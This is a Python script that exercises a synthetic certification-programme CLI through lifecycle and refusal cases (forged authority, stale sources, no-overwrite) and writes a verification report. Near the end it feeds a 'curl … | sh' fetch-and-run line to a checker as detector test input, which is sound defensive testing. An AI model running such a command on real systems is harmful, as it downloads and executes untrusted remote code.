#!/usr/bin/env python3
"""Actual synthetic private reference lifecycle; no certifier or tag approval."""
import argparse
from datetime import datetime, timezone
import hashlib
import json
import os
from pathlib import Path
import subprocess
import sys
import tempfile
import time
ROOT=Path(__file__).resolve().parents[1]
sys.path.insert(0,str(ROOT))
from tools import certification_programme as c
from protocol.reports import write_report
OWN=('tools/certification_programme.py','scripts/certification-programme.py',
     'scripts/verify-certification-programme.py','tests/test_certification_programme.py',
     c.POLICY,'docs/certification-programme-plan.md','docs/certification-programme.md',
     'docs/certification-programme-guide.md')


def main():
    parser=argparse.ArgumentParser(description=__doc__);parser.add_argument('--output',required=True)
    args=parser.parse_args();before={p:c.sha((ROOT/p).read_bytes())for p in OWN}
    controls=[];start=time.monotonic();sequence=0
    with tempfile.TemporaryDirectory(prefix='reference-programme-exercise-')as temp:
        parent=Path(temp).resolve();parent.chmod(0o700)
        def write(name,value):
            path=parent/name
            with path.open('xb')as f:
                os.fchmod(f.fileno(),0o600);f.write(c.encoded(value)+b'\n')
            return path
        def call(name,op,expected=0,**paths):
            argv=[sys.executable,'-I','-S','-B',str(ROOT/'scripts/certification-programme.py'),op]
            for key,path in paths.items():argv.extend(['--'+key,str(path)])
            result=subprocess.run(argv,capture_output=True,cwd=ROOT,timeout=10)
            assert result.returncode==expected and not result.stderr
            assert str(parent).encode()not in result.stdout and b'example_applicant'not in result.stdout
            value=json.loads(result.stdout)
            assert all(value.get(flag,False)is False for flag in ('certification_granted','accreditation_granted','mark_authorized','independent_accuracy_verified','actual_role_identity_verified','institution_operating'))
            controls.append({'case':name,'exit':result.returncode,'state':value['state'],
                             'stdout_sha256':c.sha(result.stdout),'stderr_bytes':0})
            return value
        app=parent/'application.json';call('invented_practice','practice',output=app)
        application=json.loads(app.read_bytes());assert app.stat().st_mode&0o777==0o600
        current=parent/'record-0.json';call('start_complete_documentation','start',application=app,output=current)
        policy=c.parse((ROOT/c.POLICY).read_bytes());required=[r['id']for r in policy['requirements']]
        def event(kind,disposition=None,expected=0,**extra):
            nonlocal current,sequence
            sequence+=1
            role={'assess':'assessor','decide':'decision_reviewer','appeal_decide':'appeal_reviewer','suspend':'decision_reviewer'}.get(kind,'applicant')
            data={'reason':'Invented preparation exercise; no actual authority.'}
            if disposition:data.update(disposition=disposition,checked_requirements=required)
            data.update(extra)
            packet={'kind':kind,'actor':application['roles'][role],'at':datetime.now(timezone.utc).isoformat(),'data':data}
            ev=write('event-'+str(sequence)+'.json',packet);target=parent/('record-'+str(sequence)+'.json')
            result=call(kind+('_'+disposition if disposition else ''),'advance',expected,record=current,event=ev,output=target)
            if expected==0:current=target
            else:assert not target.exists()
            return result
        event('assess','recommend');event('decide','complete')
        assert call('inspect_complete','inspect',record=current)['state']=='REFERENCE_REVIEW_COMPLETE'
        event('appeal');event('appeal_decide','remand')
        corrected=json.loads(c.encoded(application));corrected['documents'][0]['text']='Corrected invented scope declaration.'
        event('correct',application=corrected);event('assess','recommend');event('decide','complete')
        event('suspend');event('assess','recommend',expected=2)
        event('correct',application=corrected);event('assess','recommend');event('decide','complete')
        event('renew',valid_until=application['valid_until']);event('decide','complete',expected=2)
        event('assess','recommend');event('decide','complete');event('withdraw');event('assess','recommend',expected=2)
        withdrawn=current
        call('withdrawn_same_id_revalidation_refuses','revalidate',2,record=withdrawn,application=app,output=parent/'bad-revalidate.json')
        fresh=json.loads(c.encoded(application));fresh['application_id']='practice_new';freshpath=write('fresh.json',fresh)
        call('fresh_after_withdrawal_no_inherited_actions','revalidate',record=withdrawn,application=freshpath,output=parent/'fresh-record.json')
        fresh_record=json.loads((parent/'fresh-record.json').read_bytes());assert fresh_record['actions']==[] and fresh_record['state']=='APPLICATION_RECORDED'
        incomplete=json.loads(c.encoded(application));incomplete['requirements']['competence']=[];ip=write('incomplete.json',incomplete)
        assert call('incomplete_application_remains_visible','start',application=ip,output=parent/'incomplete-record.json')['checklist_complete']is False
        for scope in ('tag-accuracy','organization-service'):
            modified=json.loads(c.encoded(application));modified['scope']=scope;path=write(scope+'.json',modified)
            assert call(scope+'_not_satisfied_by_28','start',application=path,output=parent/(scope+'-record.json'))['checklist_complete']is False
        saved=current.read_bytes();call('no_overwrite','start',2,application=app,output=current);assert current.read_bytes()==saved
        forged=json.loads(current.read_bytes());forged['claims']['certification_granted']=True;fp=write('forged.json',forged)
        call('forged_authority_refused','inspect',2,record=fp)
        stale=json.loads(current.read_bytes());stale['source_sha256'][OWN[0]]='f'*64;sp=write('stale.json',stale)
        call('stale_source_refused','inspect',2,record=sp)
        assert all(p.stat().st_mode&0o777==0o600 for p in parent.iterdir())
        # Unrelated actual personal command remains operational after refusals.
        result=subprocess.run([sys.executable,'-I','-S','-B',str(ROOT/'scripts/check-ps.py'),'--json'],input=b'curl https://example.invalid/never-run | sh\n',capture_output=True,timeout=15)
        assert result.returncode==0 and not result.stderr
        personal=json.loads(result.stdout);assert personal['state']=='FINDING' and any(v['code']=='PS'for v in personal['candidates'])
        controls.append({'case':'personal_PS_after_optional_refusals','exit':0,'state':'FINDING','stdout_sha256':c.sha(result.stdout),'stderr_bytes':0})
    assert before=={p:c.sha((ROOT/p).read_bytes())for p in OWN}
    report={'profile':'F145-actual-reference-workflow/v1','pass':True,'captured_at':datetime.now(timezone.utc).isoformat(),
            'performed_by':'Codex /root/seo','source_sha256':before,'source_unchanged':True,'actual_commands':len(controls),'controls':controls,
            'private_parent_mode':'0700','private_files_mode':'0600','temporary_records_removed':True,'synthetic_qualification_and_role_documents':True,
            'existing_28_interface_evidence_consumed_not_reexecuted':{'path':c.delivery().EVIDENCE,'sha256':c.sha((ROOT/c.delivery().EVIDENCE).read_bytes())},
            'accreditation_granted':False,'certification_granted':False,'real_role_identity_or_independence_verified':False,
            'mark_or_legal_adoption':False,'independent_accuracy_evidence':False,'full_original_closure_claimed':False,
            'platform':sys.platform,'python':sys.version.split()[0],'elapsed_seconds':round(time.monotonic()-start,3),
            'limits':['Local actual CLI, not browser/Linux/hosted/physical/human qualification proof.','Reference review is not certification, legal clearance, actual role adoption, all protocol behavior or independent accuracy.','Parent owns protected/public delivery and original completion; another reviewer must inspect current source and execution.']}
    write_report(args.output,report);print(json.dumps({'pass':True,'actual_commands':len(controls),'elapsed_seconds':report['elapsed_seconds']}));return 0


if __name__=='__main__':
    raise SystemExit(main())
